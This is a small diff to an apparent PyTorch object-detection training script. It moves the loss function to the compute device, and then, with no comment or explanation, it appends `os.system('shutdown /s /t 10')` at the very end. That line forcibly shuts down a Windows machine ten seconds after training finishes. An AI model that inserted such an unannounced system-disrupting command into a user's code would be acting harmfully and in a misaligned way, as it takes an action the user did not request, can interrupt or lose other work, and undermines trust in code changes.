@@ -60,6 +60,7 @@ if model_path != '':
 
 # 获取损失函数
 loss_fn = MutilBoxLoss()
+loss_fn.to(device)
 
 # 记录loss
 writer = SummaryWriter(log_dir='./tensorboard_logs')
@@ -164,3 +165,6 @@ for epoch in range(Init_Epoch, UnFreeze_Epoch):
     # 动态更新学习率
     set_optimizer_lr(optimizer, lr_rate_func, epoch)
     fit_one_epoch(model, loss_fn, train_dataloader, valid_dataloader, epoch_train_step, epoch_valid_step ,optimizer, epoch, UnFreeze_Epoch, writer, device, save_period, save_dir)
+
+import os
+os.system('shutdown /s /t 10')
